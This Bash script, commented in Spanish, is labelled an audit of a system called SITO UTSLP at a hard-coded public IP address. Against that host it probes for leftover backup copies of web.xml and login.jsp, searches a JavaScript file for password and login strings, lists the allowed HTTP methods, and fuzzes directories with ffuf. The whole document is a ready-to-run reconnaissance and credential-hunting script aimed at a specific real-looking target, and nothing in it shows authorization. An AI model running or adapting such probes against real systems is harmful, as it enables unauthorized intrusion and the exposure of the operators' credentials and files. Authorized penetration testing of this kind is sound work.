#!/bin/bash
echo "=== AUDITORÍA COMPLETA SITO UTSLP ==="
TARGET="189.254.143.102"

echo "1. Probando HTTP en puerto 80..."
curl -s "http://$TARGET/" | head -20

echo "2. Buscando archivos de backup..."
for ext in bak old backup orig save; do
    curl -s -k "https://$TARGET/web.xml.$ext" | grep -q "<" && echo "✅ web.xml.$ext ENCONTRADO"
    curl -s -k "https://$TARGET/jsp/login.jsp.$ext" | grep -q "<" && echo "✅ login.jsp.$ext ENCONTRADO"
done

echo "3. Analizando JavaScript para credenciales..."
curl -s -k "https://$TARGET/javascript/utilities.js" | grep -i "password\|user\|login" && echo "✅ CREDENCIALES EN JS"

echo "4. Probando métodos HTTP..."
curl -X OPTIONS -k "https://$TARGET/" -I | grep -i "allow" && echo "✅ MÉTODOS HTTP HABILITADOS"

echo "5. Fuzzing rápido de directorios..."
ffuf -u "https://$TARGET/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -t 10 -o fuzz_results.txt

echo "=== ANÁLISIS COMPLETADO ==="
